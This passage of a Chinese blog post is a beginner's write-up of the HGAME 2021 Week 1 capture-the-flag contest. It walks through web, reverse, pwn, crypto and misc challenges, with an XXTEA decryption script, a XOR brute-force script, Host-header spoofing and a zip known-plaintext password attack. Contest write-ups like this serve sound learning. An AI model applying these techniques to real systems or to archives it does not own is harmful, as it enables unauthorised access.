(到底怎么改js代码我不太清楚,应该是要找到存储分数的变量,然后在 console 里修改…)</p><p>​得到 flag</p><img src="/2021/03/26/HGAME-Week1-writeup/web2(2).png" class=""><h2 id="3-宝藏走私者">3.宝藏走私者</h2><p>​先拿着学习资料学习了一下,之后点开网页点击 secret data 跳转到另一个界面,提示要是 localhost ,于是加了 host 头</p><img src="/2021/03/26/HGAME-Week1-writeup/web3.png" class=""><p>​意外的就得到了 flag  (不知道怎么得到的, 好像跟学习资料无关?)</p><h2 id="4-智商检测鸡">4.智商检测鸡</h2><p>​用 firefox 浏览器打开网页发现要做100道定积分才能得到 flag, f12看到网页源代码,里面有个 getflag() 函数</p><p>​在 console 输入后,弹出一句话(是啥我忘了) , 得知这样不行,于是我就搭配定积分计算器解完了这100题,得到 flag   (之后看r4u学长发的学习资料,觉得应该是 python 爬虫一类的,可惜我 python 还不太会,只能手动解题了)</p><p>web 总结: web 开始的时候是真的一点都不会, watermelon 和定积分都不是通过 web 知识解的,  burp 也是前几天刚装的(安装花了一天…),总之学到了很多</p><h1>2.reverse</h1><h2 id="1-apacha">1.apacha</h2><p>​应该是这周 re里最难的（但其实也不是太难），首先用 ida 打开文件并初步分析</p><img src="/2021/03/26/HGAME-Week1-writeup/re1(1).png" class=""><p>​关键部分在第25和第26行的两个函数</p><img src="/2021/03/26/HGAME-Week1-writeup/re1(3).png" class=""><p>​第一个关键函数，刚开始看觉得挺复杂的后来发现了 tea 型加密算法的特征，查资料猜测这应该是 <strong>xxtea 加密算法</strong></p><img src="/2021/03/26/HGAME-Week1-writeup/re1(4).png" class=""><p>​第二个关键函数，判断输入是否为 flag 。加密后的 flag存在unk_501C , 每四个字节一组</p><p>​之后就是写脚本解密，于是在网上找了一个现成的脚本（ c语言），改了一下就得到 flag（这里有个地方需要<strong>注意</strong>，因为是<strong>小端序</strong>所以  ida 中加密的数据每四个字节要逆序才是真正的加密数据）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tea_DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xxtea_MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea</span><span class="params">(<span class="keyword">uint32_t</span>* origin, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> data[] = </span><br><span class="line">    &#123; <span class="number">0xE74EB323</span>,<span class="number">0xB7A72836</span>,<span class="number">0x59CA6FE2</span>,<span class="number">0x967CC5C1</span>,<span class="number">0xE7802674</span></span><br><span class="line">               ,<span class="number">0x3D2D54E6</span>,<span class="number">0x8A9D0356</span>,<span class="number">0x99DCC39C</span>,<span class="number">0x7026D8ED</span>,<span class="number">0x6A33FDAD</span>,</span><br><span class="line">               <span class="number">0xF496550A</span>,<span class="number">0x5C9C6F9E</span>,<span class="number">0x1BE5D04C</span>,<span class="number">0x6723AE17</span>,<span class="number">0x5270A5C2</span>,</span><br><span class="line">               <span class="number">0xAC42130A</span>,<span class="number">0x84BE67B2</span>,<span class="number">0x705CC779</span>,<span class="number">0x5C513D98</span>,<span class="number">0xFB36DA2D</span>,</span><br><span class="line">            <span class="number">0x22179645</span>,<span class="number">0x5CE3529D</span>,<span class="number">0xD189E1FB</span>,<span class="number">0xE85BD489</span>,<span class="number">0x73C8D11F</span>,<span class="number">0x54B5C196</span>,</span><br><span class="line">            <span class="number">0xB67CB490</span>,<span class="number">0x2117E4CA</span>,<span class="number">0x9DE3F994</span>,<span class="number">0x2F5AA1AA</span>,<span class="number">0xA7E801FD</span>,<span class="number">0xC30D6EAB</span>,</span><br><span class="line">            <span class="number">0x1BADDC9C</span>,<span class="number">0x3453B04A</span>,<span class="number">0x92A406F9</span> </span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">int</span> i, j;<span class="keyword">uint32_t</span>* encode = (<span class="keyword">uint32_t</span>*)data;</span><br><span class="line">  <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">  xxtea(encode, <span class="number">-35</span>, key);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">35</span>; i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, data[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea</span><span class="params">(<span class="keyword">uint32_t</span>* origin, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">  <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">  <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">  &#123;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = origin[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      sum += tea_DELTA;</span><br><span class="line">      e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">      &#123;</span><br><span class="line">        y = origin[p + <span class="number">1</span>];</span><br><span class="line">        z = origin[p] += xxtea_MX;</span><br><span class="line">      &#125;</span><br><span class="line">      y = origin[<span class="number">0</span>];</span><br><span class="line">      z = origin[n - <span class="number">1</span>] += xxtea_MX;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">  &#123;</span><br><span class="line">    n = -n;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">    sum = rounds * tea_DELTA;</span><br><span class="line">    y = origin[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">      &#123;</span><br><span class="line">        z = origin[p - <span class="number">1</span>];</span><br><span class="line">        y = origin[p] -= xxtea_MX;</span><br><span class="line">      &#125;</span><br><span class="line">      z = origin[n - <span class="number">1</span>];</span><br><span class="line">      y = origin[<span class="number">0</span>] -= xxtea_MX;</span><br><span class="line">      sum -= tea_DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/03/26/HGAME-Week1-writeup/re1.png" class=""><h2 id="2-helloRe">2.helloRe</h2><p>​这题不难，只是有点 c++ 的语法，同样 ida</p><img src="/2021/03/26/HGAME-Week1-writeup/reverse2(1).png" class=""><p>​关键在中间的<strong>异或</strong>操作，写个脚本就能得到结果</p><img src="/2021/03/26/HGAME-Week1-writeup/reverse2.png" class=""><h2 id="3-pypy">3.pypy</h2><p>​这题考的是 python 字节码，刚开始看的时候还不太懂python语法花了点时间去理解，通过 dis 文档来分析每一条语句，大概还原了一下</p><img src="/2021/03/26/HGAME-Week1-writeup/re3.png" class=""><p>​理解之后就是用脚本解题，再加上 hgame{} （刚开始交的时候忘加了）</p><img src="/2021/03/26/HGAME-Week1-writeup/re3(2).png" class=""><h1>3.pwn</h1><h2 id="1-whitegive">1.whitegive</h2><p>​下载，在 Linux 中用 gdb 调试，得知输入数字在栈中的的存储位置为 0x7ffffffffde50</p><img src="/2021/03/26/HGAME-Week1-writeup/pwn1(3).png" class=""><p>​继续调试，发现最后 if 语句比较的是 rax 和 rdx 的值，而此时 rax 存储的是 ‘paSsw0rd’ 字符串的地址，那么只要输入这个地址的十进制值就能使条件成立</p><img src="/2021/03/26/HGAME-Week1-writeup/pwn1(2).png" class=""><img src="/2021/03/26/HGAME-Week1-writeup/pwn1(4).png" class=""><p>​nc连接，cat flag（的确挺白给的，毕竟我都能做）</p><p>pwn 总结：我也太菜了只解出白给题 ,看了最后一题但不太会 rop , 总之这周就稍微学习了一下怎么写 pwn 的脚本和一些基础知识以及安装工具</p><h1>4.crypto</h1><h2 id="2-对称之美">2.对称之美</h2><p>​打开链接下载 python 文件</p><p>​key 是在 ascii 字母和数字里随机选取16个组成，而 cipher 是由明文与循环的 key 异或得到的密文</p><p>​根据异或特性知道密文与循环的 key 异或就是明文，那么这道题重点就是求出一组 key 。多次下载附件发现 cipher 各不同，那就<strong>利用多个密文</strong>写脚本爆破得到前16位明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">de0 = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">130</span>):</span><br><span class="line">    c.append(<span class="number">0</span>)</span><br><span class="line">flag = []</span><br><span class="line"><span class="comment">#for i in range(0, 16):</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">62</span>):</span><br><span class="line">    de0.append(xor(cipher0[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher1[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher2[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher3[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher4[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher5[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher6[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher7[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher8[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher9[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher10[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher11[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher12[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher13[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher14[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher15[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher16[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher17[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher18[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher19[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher20[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher21[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher22[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher23[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher24[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher25[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher26[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher27[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher28[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher29[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher30[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher31[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher32[<span class="number">15</span>], table[j]))</span><br><span class="line">    de0.append(xor(cipher33[<span class="number">15</span>], table[j]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> de0:</span><br><span class="line">    c[j] = c[j] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span> c[j] == <span class="number">34</span>:</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br></pre></td></tr></table></figure><p>​知道前16位明文，那就可以求得一组 key ，并得到 flag，过程同样是写脚本</p><img src="/2021/03/26/HGAME-Week1-writeup/crypto2.png" class=""><img src="/2021/03/26/HGAME-Week1-writeup/crypto2(2).png" class=""><p>​Get flag!</p><h2 id="3-Transformer">3.Transformer</h2><p>​下载，发现其中一个文件中有flag形式的字符串，还有两个文件分别存储明文和密文，虽然顺序是打乱了的</p><p>​接下来就采用传统的人工查找<strong>明文和密文一一对应</strong>的方式得到flag</p><p>​当然那个 txt 文件最后解密还提示 flag 后面要加上年份2021才正确</p><p>（搜了一下题目发现是人工智能模型，我只有人工没有智能…）</p><p>crypto 总结：没想到最后竟是第一题没解出来，本来以为第二题解不出来反而解出来了。这周稍微学了点怎样写解密脚本，收获挺大</p><h1>5.misc</h1><h2 id="1-Base全家福">1.Base全家福</h2><p>​题目中提到 <strong>base家族</strong>，查资料得知有不只有 base64 ，再根据不同 base 加密字符的特征多次解密</p><img src="/2021/03/26/HGAME-Week1-writeup/misc1.png" class=""><p>​如图所示，得到 flag</p><h2 id="2-不起眼压缩包的养成的方法">2.不起眼压缩包的养成的方法</h2><p>​打开得到图片，题目中提到了<strong>压缩包</strong>，猜测能从图片中得到压缩包，于是在 linux 中用 binwalk 检测发现了压缩包，并用 foremost 命令分离出来</p><img src="/2021/03/26/HGAME-Week1-writeup/misc2(2).png" class=""><p>​分离解压后得到</p><img src="/2021/03/26/HGAME-Week1-writeup/misc2(3).png" class=""><p>​发现得到里面的文件需要密码，那就用百度识图来获取之前得到的图片的p站id解密。之后点进plain.zip发现又需要密码，并且发现plain.zip里有flag.zip和相同的NO PASSWORD.txt文件，猜测是利用明文攻击解密，用相同的方式压缩已得到的NO PASSWORD.txt。<img src="/2021/03/26/HGAME-Week1-writeup/misc2(4).png" class=""></p><p>​根据提示<strong>storage</strong>，用<strong>仅存储</strong>的方式压缩（刚开始不知道storage是存储等级所以卡了一会儿，问了学长后才知道） 再用<strong>ARCHPR</strong>进行破解，得到口令和密钥，最后得到flag.zip的内容。16进制转字符串，得flag<img src="/2021/03/26/HGAME-Week1-writeup/misc2.png" class=""></p><h2 id="3-Galaxy">3.Galaxy</h2><p>​打开连接下载，得到以**.pcapng**为后缀的文件，之后用 wireshark 打开</p><img src="/2021/03/26/HGAME-Week1-writeup/misc3(4).png" class=""><p>​如图所示，导出 http 流</p><img src="/2021/03/26/HGAME-Week1-writeup/misc3(3).png" class=""><p>​找到了遗失的 galaxy 图片，在 windows 下能正常打开，但之后把图片放到 linux 中，想用 binwalk 分析的时候发现在 Linux 下无法打开图片。</p><p>​上网查资料得知图片的<strong>高和宽可能被修改</strong>，与原来 crc 值不匹配才报错。于是在网上找了个脚本，得到正确的高宽</p><p>![](HGAME-Week1-writeup/misc3 (2).png)</p><p>​然后就用 winhex 修改高和宽并保存</p><img src="/2021/03/26/HGAME-Week1-writeup/misc3.png" class=""><p>​得到 flag！</p><img src="/2021/03/26/HGAME-Week1-writeup/galaxy1.png" class=""><h2 id="4-Word-RE-MASTER">4.Word RE:MASTER</h2><p>​下载得两个文档，发现其中一个文档加密了，那就先打开另一个文档</p><p>​在 first.docx 文档中发现了 brain 和 fuck 两个单词，猜测有<strong>brainfuck</strong> 加密，但是之后因为不知道密文卡了很久，尝试用 winhex 打开另一个文档得到</p><img src="/2021/03/26/HGAME-Week1-writeup/misc4.png" class=""><p>​我以为这就是密文了，于是就开心的拿去解密网站解密（当然这是错的）</p><p>​问了Akira 学长后发现这密文缺少了前半部分，只能转用别的方法。首先尝试把第一个文档的后缀改为 zip ，打开后竟发现</p><img src="/2021/03/26/HGAME-Week1-writeup/misc4(1).png" class=""><p>​<img src="/2021/03/26/HGAME-Week1-writeup/misc4(3).png" class=""></p><p>​丢到网站解密后得到 DOYOUKNOWHIDDEN? ，用这个打开第二个文档</p><p>​因为这个文档密码是 DOYOUKNOWHIDDEN? ，所以立马显示 word 的隐藏字符，得到</p><img src="/2021/03/26/HGAME-Week1-writeup/misc4(4).png" class=""><p>​一堆<strong>空白字符</strong>，由空格和制表符组成，这里我用箭头和点表示</p><p>​这之后就卡了很久（大概一天多…），我甚至尝试用二进制01表示，实在想不出来了于是去问学长，提示我搜一下第二个文档图片中出现最多的字的英文（之前一直盯着图片内容看，以为hint是音游梗，果然是我想太多orz）</p><p>​接着就搜索<strong>snow</strong>，知道了空白字符的隐写，上工具解密</p><img src="/2021/03/26/HGAME-Week1-writeup/misc4(5).png" class=""><p>misc总结：拿到题目后完全没思路，所以在这一周中查了很多资料，觉得自己就是个菜鸡，好在最后全部解了出来，也学到了很多东西</p>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;Week1&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    <category term="Hgame2021" scheme="https://www.0wl.site/categories/Hgame2021/"/>
    
    
    <category term="hgame" scheme="https://www.0wl.site/tags/hgame/"/>
    
  </entry>
  
</feed>
